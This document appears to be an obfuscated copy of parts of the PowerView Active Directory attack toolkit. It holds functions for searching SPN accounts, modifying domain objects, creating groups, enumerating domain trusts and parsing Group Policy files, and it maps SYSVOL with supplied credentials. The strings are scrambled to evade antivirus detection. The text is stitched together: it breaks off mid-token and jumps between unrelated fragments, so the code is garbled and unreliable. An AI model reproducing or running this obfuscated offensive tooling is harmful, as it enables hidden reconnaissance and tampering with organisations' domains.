                &(Z3b{3}{4}{0}{1}{2}Z3b -f S5zeS5z,S5zrbosS5z,S5zeS5z,S5zWrite-S5z,S5zVS5z) (S5z[S5z+S5zGetS5z+S5z-DomainComputS5z+S5zerS5z+S5z] S5z+S5zSearchS5z+S5zingS5z+S5z S5z+S5zforS5z+S5z S5z+S5zcS5z+S5zoS5z+S5zmputers S5z+S5zwithS5z+S5z S5z+S5zSPN:S','
            YoV{gPIJKoaIJKcL} JGO &(Z3b{0}{1}{2}Z3b-f S5zAddS5z,S5z-MembeS5z,S5zrS5z) (Z3b{1}{2}{0}{3}Z3b -f S5zpropS5z,S5zNotS5z,S5zeS5z,S5zertyS5z) (Z3b{1}{0}Z3b -f S5zSPathS5z,S5zADS5z) YoV{gIJKPO}.Z3bpROIJKPEIJKRtiESZ3b.Z3badIJKsPaIJKTHZ3b
            YoV{GpIJKOacL} JGO &(Z3b{2}{3}{0}{1}Z3b -fS5zmS5z,S5zberS5z,S5zAddS5z,S5z-MeS5z) (Z3b{1}{0}{3}{2}Z3b -f S5zeS5z,S5zNotepr','5zeDelS5z) YoV{TIJKeMpObjIJKEcT}.Z3bFtimEIJKDeIJKleTEDZ3b
                        YoV{OIJKUTPut} JGO &(Z3b{2}{0}{3}{1}Z3b-f S5zMemS5z,S5zrS5z,S5zAdd-S5z,S5zbeS5z) (Z3b{3}{1}{2}{0}Z3b -f S5zpertyS5z,S5zPrS5z,S5zoS5z,S5zNoteS5z) (Z3b{3}{6}{1}{0}{5}{4}{2}Z3b-fS5zinatingS5z,S5zgS5z,S5zeS5z,S5zLasS5z,S5zgS5z,S5zChanS5z,S5ztOriS5z) YoV{teIJKMpObIJKjEIJKCT}.Z3bFTIJKiMeLAStOriIJKgiNatIJKingchIJKANgeZ3b
                        YoV{oIJKUIJKTpuT} JGO &(Z3b{1}{0}{2}Z3b -fS5zdd-MembeS5z,S5zAS5z,S5zrS5z) (Z3b{1}{0}{2}{3}Z3b-fS5zotePS5z,S5zNS5z,S5zroS5z,S5zpertyS5z) (Z3b{0}{2}{1}Z3b -f S5zVersS5z,S5znS5z,S5zioS5z) YoV{temIJKpObIJKjIJKECT}.Z3bDwVIJKeRsioNZ3b
                        YoV{OIJKUtPuT} JGO &(Z3b{0}{1}{2}Z3b -fS5zAdd-MS5z,S5zembeS5z,S5zrS5z) (Z3b{1}{2}{0}Z3b -f S5zertyS5z,S5zNoteProS5z,S5zpS5z) (Z3b{3}{1}{0}{2}Z3b-f S5zriginatinS5z,S5ztOS5z,S5zgDsaDNS5z,S5zLasS5z) YoV{TIJKEmIJKpobjIJKeCT}.Z3bpsZLasIJKTIJKORIJKIGInAtIJKinIJKgIJKdsIJKADNZ3b
                        YoV{OUIJKTIJKpUt}.Z3bPSIJKOBIJKJecTZ3b.Z3btyIJKPIJKeNaMEsZ3b.(Z3b{0}{1}{2}Z3b -fS5zInS5z,S5zsS5z,S5zertS5z).Invoke(0, (Z3b{0}{4}{9}{10}{6}{7}{3}{8}{5}{1}{2}Z3b-fS5zPoweS5z,S5zteHistoS5z,S5zryS5z,S5zeS5z,S5zrVS5z,S5zribuS5z,S5zDObjectLiS5z,S5znkS5z,S5zdAttS5z,S5ziS5z,S5zew.AS5z))
                        YoV{OIJKUtpUT}
                    }
                }
                else {
                    &(Z3b{1}{0}{2}Z3b -fS5zerS5z,S5zWrite-VS5z,S5zboseS5z) (S5z[Get-DS5z+S5zomainObjS5z+S5zectLinkS5z+S5zedAttS5z+S5zributeHistS5z+S5zory]S5z+S5z S5z+S5zErrS5z+S5zorS5z+S5z S5z+S5zreS5z+S5ztS5z+S5zrievingS5z+S5z S5z+(S5zG8S5z+S5z9msdS5z+S5zsS5z+S5z-replvaS5z+S5zlS5z+S5zuemeS5z+S5ztadS5z+S5zataG89S5z+S5z S5z).Z3bRIJKEPlAIJKCEZ3b(S5zG89S5z,[StrINg][cHaR]39)+S5zforS5z+S5z S5z+Z3bS5zYoVObjectDNS5zZ3b)
                }
            }
        }
    }
}


function SeT-dOMIJKAIJKiNoIJKBJeIJKCT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{6}{4}{0}{7}{1}{5}{3}Z3b-f S5zForS5z,S5zhanS5z,S5zPSUseS5z,S5zingFunctionsS5z,S5zrocessS5z,S5zgS5z,S5zShouldPS5z,S5zStateCS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{3}{0}{1}{2}Z3b -fS5zSSS5z,S5zhouldProceS5z,S5zssS5z,S5zPS5z}, S5zS5z)]
    [CmdletBinding()]
    Param(
        [Parameter(poSiTiOn = 0, MaNDatOrY = YoV{TRIJKUE}, VaLUEfROMPIpElInE = YoV{TRIJKUe}, vAluEfrOmpipeLiNEbyPRopERTYnaME = YoV{tIJKRuE})]
        [Alias({Z3b{2}{3}{0}{1}{4}Z3b-fS5zsheS5z,S5zdNS5z,S5zDistinguS5z,S5ziS5z,S5zameS5z}, {Z3b{2}{0}{3}{1}Z3b-f S5zmAccS5z,S5zNameS5z,S5zSaS5z,S5zountS5z}, {Z3b{1}{0}Z3b-fS5zmeS5z,S5zNaS5z})]
        [String[]]
        YoV{iIJKDENTiIJKTY},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}{2}Z3b -fS5zReS5z,S5zplaS5z,S5zceS5z})]
        [Hashtable]
        YoV{SIJKeT},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        YoV{xIJKoR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{CLIJKEAr},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dIJKoIJKMAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b -f S5zFilS5z,S5zterS5z})]
        [String]
        YoV{ldaPIJKFilIJKTEr},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}{2}Z3b -fS5zADS5z,S5zSPaS5z,S5zthS5z})]
        [String]
        YoV{SearIJKchIJKBaIJKse},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}{2}{3}Z3b-fS5zDomainConS5z,S5ztS5z,S5zrolleS5z,S5zrS5z})]
        [String]
        YoV{seIJKRVEr},

        [ValidateSet({Z3b{0}{1}Z3b-fS5zBasS5z,S5zeS5z}, {Z3b{1}{2}{0}Z3b-f S5zvelS5z,S5zOS5z,S5zneLeS5z}, {Z3b{1}{2}{0}Z3b -fS5zreeS5z,S5zSubS5z,S5ztS5z})]
        [String]
        YoV{SEaIJKRChsCIJKOPe} = (Z3b{0}{1}Z3b -f S5zSuS5z,S5zbtreeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{resIJKULTIJKPIJKAgESIJKizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{sERvIJKerTiIJKmEIJKlIJKimIT},

        [Switch]
        YoV{tIJKOmbSTIJKoNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CredIJKENIJKTiIJKAl} =   YoV{JIJKFi}::Z3beMIJKPTYZ3b
    )

    BEGIN {
        YoV{seAIJKRIJKcheIJKRaIJKRGUIJKmEnTs} = @{S5zRawS5z = YoV{TrIJKUe}}
        if (YoV{psIJKBIJKoUIJKNDParAmetErs}[(Z3b{1}{0}{2}Z3b-f S5zmaiS5z,S5zDoS5z,S5znS5z)]) { YoV{SeARcheRarGIJKUIJKMIJKentS}[(Z3b{0}{1}Z3b-fS5zDomaS5z,S5zinS5z)] = YoV{dOIJKmAIJKIn} }
        if (YoV{PSBoIJKUnIJKDPAraIJKmEtERS}[(Z3b{1}{0}{2}Z3b -fS5ztS5z,S5zLDAPFilS5z,S5zerS5z)]) { YoV{sIJKEaIJKRCHIJKeRIJKARgUMEIJKNtS}[(Z3b{2}{3}{0}{1}Z3b-f S5zeS5z,S5zrS5z,S5zLDAPFiS5z,S5zlt','S5zNS5z,S5zoneS5z)
            YoV{CIJKOnIJKTROlTypE} = [System.Secur','s.SuppressMessageAttribute({Z3b{2}{4}{3}{0}{1}Z3b-f S5zesS5z,S5zsS5z,S5zPS5z,S5zouldProcS5z,S5zSShS5z}, S5zS5z)]
    [OutputType({Z3b{8}{7}{4}{2}{1}{3}{0}{9}{5}{6}Z3b -fS5zntS5z,S5zountManS5z,S5z.AccS5z,S5zagemeS5z,S5zrvicesS5z,S5zpPrinS5z,S5zcipalS5z,S5zSeS5z,S5zDirectoryS5z,S5z.GrouS5z})]
    Param(
        [Parameter(MaNdatOry = YoV{TIJKRuE})]
        [ValidateLength(0, 256)]
        [String]
        YoV{sAmAcCIJKoUIJKNTnIJKAmE},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{nAIJKME},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dIspIJKLAIJKYNAIJKMe},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{desIJKcrIIJKPTion},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dIJKOmIJKAin},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{crIJKEIJKDENTiIJKAL} =   YoV{jIJKFi}::Z3bemIJKPTYZ3b
    )

    YoV{CONIJKTIJKeXIJKTaRGuIJKmeNTs} = @{
        (Z3b{0}{1}Z3b -f S5zIdentitS5z,S5zyS5z) = YoV{SIJKAIJKMIJKAcCOUNtNaIJKmE}
    }
    if (YoV{PSBoUnIJKdpAIJKRAMetIJKEIJKRs}[(Z3b{0}{1}Z3b -fS5zDomaiS5z,S5znS5z)]) { YoV{cOIJKNTeIJKXIJKTARgumenTs}[(Z3b{1}{0}Z3b -f S5znS5z,S5zDomaiS5z)] = YoV{DOIJKMAiN} }
    if (YoV{pSbIJKOuNdpaRAIJKmeTIJKEIJKRS}[(Z3b{1}{0}{2}{3}Z3b -fS5zedS5z,S5zCrS5z,S5zenS5z,S5ztialS5z)]) { YoV{conTeXIJKTaIJKRgIJKUIJKMenTs}[(Z3b{1}{0}{2}Z3b -fS5zaS5z,S5zCredentiS5z,S5zlS5z)] = YoV{cIJKREdIJKENTIJKiAl} }
    YoV{CoIJKNIJKText} = &(Z3b{5}{1}{3}{0}{2}{4}Z3b -f S5zalConS5z,S5zrincS5z,S5zteS5z,S5zipS5z,S5zxtS5z,S5zGet-PS5z) @ContextArguments

    if (YoV{cIJKOnTeXt}) {
        YoV{GIJKRoUP} = &(Z3b{1}{3}{2}{0}Z3b -fS5ztS5z,S5zNS5z,S5zbjecS5z,S5zew-OS5z) -TypeName (Z3b{1}{0}{2}{3}{5}{6}{9}{4}{8}{7}Z3b-fS5zDirecS5z,S5zSystem.S5z,S5ztorS5z,S5zyServicesS5z,S5zoupS5z,S5z.AccountManagemS5z,S5zenS5z,S5zincipalS5z,S5zPrS5z,S5zt.GrS5z) -ArgumentList (YoV{conIJKTeIJKxt}.Z3bcoNTIJKeXtZ3b)

        
        YoV{gROIJKUP}.Z3bsIJKAIJKmaIJKCCoUNtnAmeZ3b = YoV{cIJKoNtExT}.Z3bIIJKDeNtiTyZ3b

        if (YoV{psBoundIJKPARIJKAIJKMEtIJKErs}[(Z3b{0}{1}Z3b-f S5zNS5z','5}{1}{3}Z3b -fS5z(objectS5z,S5zainS5z,S5zClass=S5z,S5z)S5z,S5ztrustedDS5z,S5zomS5z)

                if (YoV{pSBouIJKNIJKdPARaIJKMIJKEtErS}[(Z3b{1}{0}{2}Z3b-f S5zindS5z,S5zFS5z,S5zOneS5z)]) { YoV{RIJKESUlTs} = YoV{tRIJKUsIJKTSEaIJKRIJKchEr}.(Z3b{2}{0}{1}Z3b-fS5zndS5z,S5zOneS5z,S5zFiS5z).Invoke() }
                else { YoV{RESULIJKTS} = YoV{tIJKRuSIJKTsEARIJKcHeR}.(Z3b{0}{1}{2}Z3b -fS5zFinS5z,S5zdAlS5z,S5zlS5z).Invoke() }
                YoV{reIJKSuLIJKTS} JGO &(Z3b{2}{0}{1}Z3b -fS5zbjeS5z,S5zctS5z,S5zWhere-OS5z) {YoV{_}} JGO &(Z3b{4}{0}{1}{2}{3}Z3b-f S5zorS5z,S5zEachS5z,S5z-ObjS5z,S5zectS5z,S5zFS5z) {
                    YoV{PIJKRopS} = YoV{_}.Z3bPIJKRopErTIJKIIJKESZ3b
                    YoV{DOIJKMaiNTRIJKUSt} = &(Z3b{1}{0}{2}Z3b -f S5zw-ObjeS5z,S5zNeS5z,S5zctS5z) (Z3b{1}{0}{2}Z3b-f S5zbjeS5z,S5zPSOS5z,S5zctS5z)

                    YoV{TRuIJKStaIJKTtRIJKIB} = @()
                    YoV{tIJKRUStAIJKTTRIB} += YoV{tIJKRUStAIJKTIJKTribUTES}.Z3bKIJKEysZ3b JGO &(Z3b{0}{2}{1}Z3b -fS5zWheS5z,S5ze-ObjectS5z,S5zrS5z) { YoV{PRIJKoIJKPs}.Z3btrUIJKSTIJKAttrIbIJKUTESZ3b[0] -band YoV{_} } JGO &(Z3b{4}{3}{1}{2}{0}Z3b-fS5zjectS5z,S5z-OS5z,S5zbS5z,S5zrEachS5z,S5zFoS5z) { YoV{TrUstIJKATTIJKRIbIJKUIJKTeS}[YoV{_}] }

                    YoV{dIJKIIJKRection} = Switch (YoV{prIJKOIJKpS}.Z3bTIJKRUSIJKTdIrEIJKcIJKTIONZ3b) {
                        0 { (Z3b{2}{1}{0}Z3b-fS5zdS5z,S5zleS5z,S5zDisabS5z) }
                        1 { (Z3b{0}{2}{1}Z3b -fS5zIS5z,S5zundS5z,S5znboS5z) }
                        2 { (Z3b{1}{0}{2}Z3b-fS5zboS5z,S5zOutS5z,S5zundS5z) }
                        3 { (Z3b{0}{1}{3}{2}Z3b-fS5zBiS5z,S5zdirS5z,S5zlS5z,S5zectionaS5z) }
                    }

                    YoV{TrIJKUsttYIJKPe} = Switch (YoV{pIJKROIJKps}.Z3bTruIJKSTtIJKYPeZ3b) {
                        1 { (Z3b{1}{4}{0}{3}{5}{2}Z3b-f S5zONS5z,S5zWIS5z,S5z_DIRECTORYS5z,S5z_AS5z,S5zNDOWS_NS5z,S5zCTIVES5z) }
                        2 { (Z3b{2}{4}{3}{6}{5}{1}{0}Z3b-fS5zRYS5z,S5zCTOS5z,S5zWINS5z,S5zWS_ACTIVS5z,S5zDOS5z,S5z_DIRES5z,S5zES5z) }
                        3 { S5zMITS5z }
                    }

                    YoV{disTiIJKNGuIJKiSIJKhIJKedNIJKAmE} = YoV{PRIJKOPS}.Z3bdIstIJKiIJKNGuIJKIsHEdNaMeZ3b[0]
                    YoV{soUIJKRCIJKENIJKAmeIJKInIJKdex} = YoV{DIJKisTINIJKGUisIJKhEDNAMe}.(Z3b{0}{1}Z3b -f S5zIndS5z,S5zexOfS5z).Invoke(S5zDC=S5z)
                    if (YoV{sOurCEIJKNAmeIJKINdeX}) {
                        YoV{SOUIJKRIJKceDIJKOMAin} = YoV(YoV{DISIJKTiNgIJKUIsIJKhIJKEdNaMe}.(Z3b{1}{2}{0}Z3b-f S5zgS5z,S5zSubS5z,S5zStrinS5z).Invoke(YoV{soUrIJKCEnIJKAmeIJKinDex})) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                    }
                    else {
                        YoV{SOURCEdOIJKMIJKAIn} = Z3bZ3b
                    }

                    YoV{taRGIJKEtnamIJKeINdEX} = YoV{DIJKisTInGuiIJKsheIJKdnaME}.(Z3b{1}{2}{0}Z3b -f S5zfS5z,S5zIS5z,S5zndexOS5z).Invoke((Z3b{1}{0}{2}Z3b-f S5zteS5z,S5z,CN=SysS5z,S5zmS5z))
                    if (YoV{SOUrCIJKeNaMEIJKIIJKNdEX}) {
              ','{mIJKeIJKMBer} JGO &(Z3b{0}{2}{1}Z3b-fS5zAddS5z,S5zerS5z,S5z-MembS5z) (Z3b{0}{2}{1}{3}Z3b-fS5zNoteproS5z,S5ztS5z,S5zperS5z,S5zyS5z) S5zSIDS5z YoV{SIJKidSTIJKRiNG}
                            YoV{iSgrIJKOIJKUp} = YoV(YoV{IIJKNFo}.Z3bLgrMIJKi2IJK_sIDIJKUSAGEZ3b -eq (Z3b{0}{2}{1}Z3b-fS5zSS5z,S5zroupS5z,S5zidTypeGS5z))
                            YoV{MemIJKBIJKer} JGO &(Z3b{1}{2}{3}{0}Z3b -f S5zerS5z,S5zAS5z,S5zddS5z,S5z-MembS5z) (Z3b{3}{2}{0}{1}Z3b-fS5zpeS5z,S5zrtyS5z,S5zproS5z,S5zNoteS5z) (Z3b{1}{2}{0}Z3b -f S5zoupS5z,S5zIsS5z,S5zGrS5z) YoV{IIJKsIJKgrOUp}
                            YoV{mEIJKMbEr}.Z3bPSoIJKBJEIJKctZ3b.Z3btypEnIJKAIJKMeSZ3b.(Z3b{0}{1}{2}Z3b-f S5zIS5z,S5znsS5z,S5zertS5z).Invoke(0, (Z3b{4}{2}{0}{5}{1}{3}Z3b-f S5zMS5z,S5zr.S5z,S5zrView.LocalGroupS5z,S5zAPIS5z,S5zPoweS5z,S5zembeS5z))
                            YoV{meIJKmbeRs} += YoV{MemIJKBIJKeR}
                        }
                    }

                    
                    YoV{NIJKULL} = YoV{nIJKETaIJKPi32}::(Z3b{0}{1}{2}{3}Z3b-fS5zNetAS5z,S5zpiBuffS5z,S5zerFrS5z,S5zeeS5z).Invoke(YoV{ptRIIJKNFO})

                    
                    YoV{maChIIJKNIJKesID} = YoV{MeIJKmIJKBeRs} JGO &(Z3b{1}{2}{0}Z3b -fS5ze-ObjectS5z,S5zWhS5z,S5zerS5z) {YoV{_}.Z3bsIJKIDZ3b -match (Z3b{1}{0}Z3b -f S5z0S5z,S5z.*-50S5z) -or (YoV{_}.Z3bsIJKIdZ3b -match (Z3b{0}{1}Z3b -f S5z.*-5S5z,S5z01S5z))} JGO &(Z3b{1}{3}{0}{2}Z3b -fS5zjS5z,S5zSelectS5z,S5zectS5z,S5z-ObS5z) -Expand (Z3b{0}{1}Z3b -f S5zSIS5z,S5zDS5z)
                    if (YoV{MAcIJKHIIJKNESid}) {
                        YoV{MaIJKChIJKIIJKNesId} = YoV{machIIJKNESIJKID}.(Z3b{2}{1}{0}Z3b-fS5zingS5z,S5zstrS5z,S5zSubS5z).Invoke(0, YoV{MaIJ','Z3b-fS5zfTypeS5z,S5zkeByReS5z,S5zMaS5z).Invoke())),
    (&(Z3b{1}{0}Z3b-f S5zcS5z,S5zfunS5z) (Z3b{0}{1}Z3b -f S5znS5z,S5zetapi32S5z) (Z3b{0}{1}{2}{4}{3}Z3b-','emveS5z,S5zatingsS5z),(Z3b{0}{2}{1}Z3b -f S5zprS5z,S5zidS5z,S5zimarygroupS5z),(Z3b{2}{1}{0}Z3b-f S5zlastsetS5z,S5zdS5z,S5zpwS5z),(Z3b{2}{0}{3}{1}Z3b-f S5zaccouS5z,S5zameS5z,S5zsamS5z,S5zntnS5z),(Z3b{3}{0}{2}{1}Z3b -fS5zmaccountS5z,S5zypeS5z,S5ztS5z,S5zsaS5z),(Z3b{0}{2}{1}{3}Z3b-f S5zserS5z,S5zeprincipaS5z,S5zvicS5z,S5zlnameS5z),(Z3b{0}{2}{1}{3}Z3b-fS5zuS5z,S5zcouS5z,S5zseracS5z,S5zntcontrolS5z),(Z3b{3}{0}{2}{1}Z3b -fS5zsnchanS5z,S5zedS5z,S5zgS5z,S5zuS5z),(Z3b{2}{0}{1}Z3b-fS5zeatS5z,S5zedS5z,S5zusncrS5z),(Z3b{2}{1}{0}Z3b -f S5zedS5z,S5zhangS5z,S5zwhencS5z),(Z3b{0}{1}{2}Z3b-fS5zwhencreS5z,S5zateS5z,S5zdS5z))

        YoV{','S5z+S5zable S5z+S5ztS5z+S5zo S5z+S5zreS5z+S5ztrieS5z+S5zve S5z+S5zdoS5z+S5zmainS5z+S5z S5z+S5zseaS5z+S5zrS5z+S5zcher S5z+S5zfoS5z+S5zr S5z+Z3bS5zYoVIdentityDomainS5zZ3b)
                        }
                    }
                }
                elseif (YoV{IdENTityiNIJKSIJKTIJKANCE} -imatch S5z^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}YoVS5z) {
                    YoV{GUIJKIdByTIJKesIJKTRInG} = (([Guid]YoV{IIJKDeNTiIJKTyIJKiNIJKsTIJKAnCE}).(Z3b{3}{2}{0}{1}Z3b -f S5zaS5z,S5zyS5z,S5zteArrS5z,S5zToByS5z).Invoke() JGO &(Z3b{2}{1}{0}Z3b-f S5ztS5z,S5zObjecS5z,S5zForEach-S5z) { S5z5rjS5z + YoV{_}.(Z3b{1}{0}{2}Z3b -fS5zriS5z,S5zToStS5z,S5zngS5z).Invoke(S5zX2S5z) }) -join S5zS5z
                    YoV{idIJKENTITIJKyfILIJKTEr} += Z3b(objectguid=YoVGuidByteString','IJKpTTMpIJKLpAth},

        [Switch]
        YoV{OUtIJKPUIJKToBJEIJKcT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CrEdEIJKNIJKTIal} =   YoV{jIJKFi}::Z3bEIJKMPtYZ3b
    )

    BEGIN {
        YoV{mAPpEIJKDpAIJKThS} = @{}
    }

    PROCESS {
        try {
            if ((YoV{gPTtIJKMIJKPlpaIJKTh} -Match (((Z3b{5}{1}{4}{0}{3}{2}Z3b -fS5z*{S5z,S5z{S5z,S5z{0}.*S5z,S5z0}S5z,S5z0}{0}{0}.S5z,S5z{0}S5z))-f[cHar]92)) -and (YoV{pSboUIJKNdPIJKArAMIJKeteRs}[(Z3b{0}{1}{2}Z3b -f S5zCredentiS5z,S5zaS5z,S5zlS5z)])) {
                YoV{SyIJKsvIJKOlPatH} = Z3b5rj5rjYoV((New-Object System.Uri(YoVGptTmplPath)).Host)5rjSYSVOL Z3b
                if (-not YoV{maIJKppIJKEdPaTHs}[YoV{SYsvIJKoIJKlIJKPath}]) {
                    
                    &(Z3b{4}{5}{1}{3}{0}{2}Z3b -f S5ziS5z,S5znneS5z,S5zonS5z,S5zctS5z,S5zAdd-ReS5z,S5zmoteCoS5z) -Path YoV{sySVIJKOIJKlpaIJKTh} -Credential YoV{cREDeNIJKTIJKIAL}
                    YoV{MaIJKppEDpaIJKTHs}[YoV{SysVoLIJKPIJKAth}] = YoV{TIJKRuE}
                }
            }

            YoV{tarIJKgeIJKTgIJKPtIJKTmplpaIJKTh} = YoV{GPIJKTIJKTmplpAIJKTh}
            if (-not YoV{TaRgEIJKTGPIJKTIJKTMPLPaIJKTh}.(Z3b{2}{0}{1}Z3b-f S5zsWiS5z,S5zthS5z,S5zEndS5z).Invoke((Z3b{0}{1}Z3b-fS5z.inS5z,S5zfS5z))) {
                YoV{targIJKEtgptTmIJKPIJKLIJKpAIJKTh} += (((Z3b{3}{4}{12}{5}{6}{14}{10}{13}{0}{2}{7}{15}{1}{8}{11}{9}Z3b-f S5zdows S5z,S5zdiS5z,S5zNS5z,S5z{0}MACHINE{0S5z,S5z}MicS5z,S5zosS5z,S5zoS5z,S5zT{0}S5z,S5zt{S5z,S5zfS5z,S5z0}WS5z,S5z0}GptTmpl.inS5z,S5zrS5z,S5zinS5z,S5zft{S5z,S5zSecES5z)) -F[ChAr]92)
            }

            &(Z3b{2}{1}{3}{0}Z3b-fS5zeS5z,S5zrite-VerS5z,S5zWS5z,S5zbosS5z) (S5z[GetS5z+S5z-GS5z+S5zptTS5z+S5zmpl] S5z+S5zPS5z+S5zarsiS5z+S5zng S5z+S5zGptTS5z+S5zmplPS5z+S5zath: S5z+Z3bYoVTargetGptTmplPathZ3b)

            if (YoV{pIJKsbIJKoUIJKNIJKDPARaMeTIJKerS}[(Z3b{0}{3}{1}{2}Z3b -f S5zOuS5z,S5zputObjS5z,S5zectS5z,S5ztS5z)]) {
                YoV{contIJKEIJKNtS} = &(Z3b{1}{0}{2}Z3b-fS5ztS5z,S5zGet-IniConS5z,S5zentS5z) -Path YoV{TaIJKRGETgPtTIJKmpLPIJKAtH} -OutputObject -ErrorAction (Z3b{0}{1}Z3b -fS5zStS5z,S5zopS5z)
                if (YoV{cONTIJKEIJKNIJKTs}) {
                    YoV{COIJKNtIJKenTS} JGO &(Z3b{0}{2}{1}Z3b-fS5zAdS5z,S5zmberS5z,S5zd-MeS5z) (Z3b{2}{0}{1}Z3b -fS5zepropertS5z,S5zyS5z,S5zNotS5z) (Z3b{0}{1}Z3b-fS5zPS5z,S5zathS5z) YoV{tIJKAIJKRGEIJKTGpIJKTTMIJKpLpAth}
                    YoV{conIJKTIJKEIJKNtS}
                }
            }
            else {
                YoV{cONtIJKenTS} = &(Z3b{0}{2}{1}{4}{3}Z3b -fS5zGet-S5z,S5zCoS5z,S5zIniS5z,S5ztS5z,S5zntenS5z) -Path YoV{TIJKARGIJKEIJKTGpTTIJKmPLIJKPaTh} -ErrorAction (Z3b{1}{0}Z3b-f S5zpS5z,S5zStoS5z)
                if (YoV{coNIJKTIJKEntS}) {
                    YoV{CIJKOnIJKTEnts}[(Z3b{0}{1}Z3b -fS5zPatS5z,S5zhS5z)] = YoV{TaIJKRgEtgPtTIJKMpIJKlpAth}
                    YoV{cONIJKTeIJKNTs}
                }
            }
        }
        catch {
            &(Z3b{2}{1}{0}{3}Z3b -fS5z-VerS5z,S5zriteS5z,S5zWS5z,S5zboseS5z) (S5z[GeS5z+S5zt-GS5z+S5zptTS5z+S5zmpS5z+S5zl] S5z+S5zErS5z+S5zror S5z+S5zpaS5z+S5zrsing S5z+Z3bYoVTargetGptTmplPath Z3b+S5z: S5z+Z3bYoV_Z3b)
        }
    }

    END {
        
        YoV{MAPIJKpEdIJKPIJKAtHS}.Z3bKeIJKYsZ3b JGO &(Z3b{4}{2}{0}{3}{1}Z3b-f S5zrEach-ObS5z,S5ztS5z,S5zoS5z,S5zjecS5z,S5zFS5z) { &(Z3b{5}{3}{4}{1}{2}{0}{6}Z3b-f S5zonneS5z,S5zmotS5z,S5zeCS5z,S5zoveS5z,S5z-ReS5z,S5zRemS5z,S5zctionS5z) -Path YoV{_} }
    }
}


function GIJKeT-GRoIJKUpSIJKxIJKmL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{3}{1}{2}{0}','{0}{1}Z3b-fS5zFilterS5z,S5zsS5z) YoV{NuIJKlL}
                    YoV{GPOGIJKRIJKOUP} JGO &(Z3b{0}{1}{2}Z3b-fS5zAS5z,S5zdd-MS5z,S5zemberS5z) (Z3b{3}{2}{1}{0}Z3b-f S5zyS5z,S5zertS5z,S5zpropS5z,S5zNoteS5z) (Z3b{0}{3}{2}{1}Z3b -f S5zGrouS5z,S5zeS5z,S5zamS5z,S5zpNS5z) YoV{GrIJKOUIJKPname}
                    YoV{GIJKPoIJKgRoup} JGO &(Z3b{1}{2}{0}Z3b -f S5z-MemberS5z,S5zAS5z,S5zddS5z) (Z3b{1}{0}{2}Z3b -fS5zeproS5z,S5zNotS5z,S5zpertyS5z) (Z3b{2}{0}{1}Z3b-f S5zSS5z,S5zIDS5z,S5zGroupS5z) YoV{grOuIJKPIJKsiD}
                    YoV{gpOGrIJKoUp} JGO &(Z3b{2}{1}{0}Z3b -fS5zmberS5z,S5zeS5z,S5zAdd-MS5z) (Z3b{2}{1}{0}{3}Z3b-f S5zrS5z,S5ztepropeS5z,S5zNoS5z,S5ztyS5z) (Z3b{0}{2}{1}Z3b -f S5zGroupS5z,S5zberOfS5z,S5zMemS5z) YoV{MemIJKBErShIJKip}.Z3bvIJKALUEZ3b.Z3bMeMbIJKEIJKRofZ3b
                    YoV{GpoIJKgrIJKoIJKUP} JGO &(Z3b{3}{2}{1}{0}Z3b-fS5zrS5z,S5zembeS5z,S5z-MS5z,S5zAddS5z) (Z3b{3}{1}{2}{0}Z3b-f S5zpertyS5z,S5ztepS5z,S5zroS5z,S5zNoS5z) (Z3b{0}{2}{3}{1}Z3b -f S5zGroupS5z,S5zmbersS5z,S5zMS5z,S5zeS5z) YoV{MEIJKMBIJKeRSHIp}.Z3bValIJKUeZ3b.Z3bmIJKEmBeRSZ3b
                    YoV{gpOIJKgRIJKOUP}.Z3bPsoBJeIJKCTZ3b.Z3bTYPeIJKNAIJKMeSZ3b.(Z3b{1}{0}Z3b-f S5zsertS5z,S5zInS5z).Invoke(0, (Z3b{2}{1}{0}{3}Z3b-fS5zGroS5z,S5zerView.GPOS5z,S5zPowS5z,S5zupS5z))
                    YoV{gPIJKOIJKGRouP}
                }
            }

            
            YoV{pIJKArsIJKeARGS} =  @{
                (Z3b{3}{0}{1}{2}Z3b -f S5zsXS5z,S5zMS5z,S5zLpathS5z,S5zGroupS5z) = Z3bYoVGPOPath5rjMACHINE5rjPreferences5rjGroups5rjGroups.xmlZ3b
            }

            &(Z3b{0}{1}{3}{2}Z3b-f S5zGet-GrS5z,S5zoS5z,S5zLS5z,S5zupsXMS5z) @ParseArgs JGO &(Z3b{1}{4}{3}{0}{2}Z3b -fS5zh-ObjS5z,S5zFoS5z,S5zectS5z,S5zEacS5z,S5zrS5z) {
                if (YoV{PIJKSIJKBIJKoUIJKNDIJKpARAmeters}[(Z3b{4}{0}{3}{1}{2}Z3b-f S5zveMeS5z,S5zSIS5z,S5zDsS5z,S5zmbersToS5z,S5zResolS5z)]) {
                    YoV{GROUPIJKmEIJKmbeRS} = @()
                    ForEach (YoV{meIJKMBIJKER} in YoV{_}.Z3bGRIJKOUIJKpIJKMEMBeRsZ3b) {
                        if (YoV{MIJKEmBEr} -and (YoV{mIJKEmber}.(Z3b{0}{1}Z3b-fS5zTS5z,S5zrimS5z).Invoke() -ne S5zS5z)) {
                            if (YoV{MeIJKmBeR} -notmatch (Z3b{2}{0}{1}Z3b -f S5zS-1S5z,S5z-.*S5z,S5z^S5z)) {

                                
